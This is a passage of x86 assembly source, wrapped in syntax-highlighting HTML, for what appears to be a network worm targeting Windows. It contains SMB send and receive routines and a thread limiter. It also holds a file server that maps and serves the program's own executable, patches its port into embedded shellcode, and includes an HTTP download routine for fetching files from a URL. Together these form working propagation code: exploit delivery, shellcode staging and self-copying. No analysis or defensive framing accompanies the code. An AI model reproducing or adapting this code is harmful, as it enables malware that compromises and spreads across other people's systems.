    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2196</span><span class="sc0">   </span><span class="sc1">;`` ``</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;`` ``</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;`` ``</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_recvbuf_LEN</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_recvbuf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">

</span><span class="sc5">.cs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@AddThreadNum</span><span class="sc0">  </span><span class="sc1">;dec THREADNUM</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">



</span><span class="sc1">;ARGS:  ebx = socket</span><span class="sc0">
</span><span class="sc1">;ARG1:  buffer</span><span class="sc0">
</span><span class="sc1">;ARG2:  length</span><span class="sc0">
</span><span class="sc1">;ARG3:  seconds timeout</span><span class="sc0">
</span><span class="sc1">; RETURN: bytes received</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@arecv</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;fd_array[0]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;fd_count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;seconds timeout</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">            </span><span class="sc1">;struct timeval</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">select</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0xC</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc0">

</span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">0xC</span><span class="sc0">


</span><span class="sc1">;ARG1:  output buffer</span><span class="sc0">
</span><span class="sc1">;ARG2:  input buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@convert_name</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0xC</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;input buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">

    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;output buffer</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc2">.1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc2">.1</span><span class="sc0">

</span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">


</span><span class="sc1">;ARGS: 1 inc    -1 dec</span><span class="sc0">
</span><span class="sc1">;Registers used: ALL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@AddThreadNum</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;RET/clean stack</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CS_THREADNUM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EnterCriticalSection</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">THREADNUM</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;THREADNUM</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CS_THREADNUM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LeaveCriticalSection</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">@WaitMaxThreads</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">.loop1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">THREADNUM</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">MAX_THREADS</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">TIMEOUT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.loop1</span><span class="sc0">
</span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ARG1:  client socket</span><span class="sc0">
</span><span class="sc5">@ServerThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;client socket</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">



</span><span class="sc5">@FileServer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc1">;int3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szFileName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwFileNameLen</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileName</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.sock1</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;`` ``</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;`` ``</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;CreateFileMapping</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFilePointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc5">.sock1</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">bind</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getsockname</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">


</span><span class="sc1">;SHELLCODE PORT</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SHELLCODE_XORPORT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">shellcode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SHELLCODE_PORT</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SOMAXCONN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">listen</span><span class="sc0">

</span><span class="sc5">.acceptLoop</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">accept</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.acceptLoop</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;client socket</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@ServerThread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.acceptLoop</span><span class="sc0">       </span><span class="sc1">;infinite loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">



</span><span class="sc1">;ARGS:      edi = url</span><span class="sc0">
</span><span class="sc1">;RETURN:    ebx = filename saved</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@GetUrl</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;[ebp - 4]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;[ebp - 8]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;[ebp - 0xC]</span><span class="sc0">

</span><span class="sc9">%define</span><span class="sc0">     </span><span class="sc5">DL_FILENAME</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0">     </span><span class="sc5">HTTP_NEWLINE</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0xC</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'/'</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xfffffff0</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">    </span><span class="sc1">;host</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">;url</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HTTP_FMT</span><span class="sc0">   </span><span class="sc1">;'GET %s HTTP/1.1\r\nHost: %s\r\n\r\n'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HTTP_BUFFER</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wsprintf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
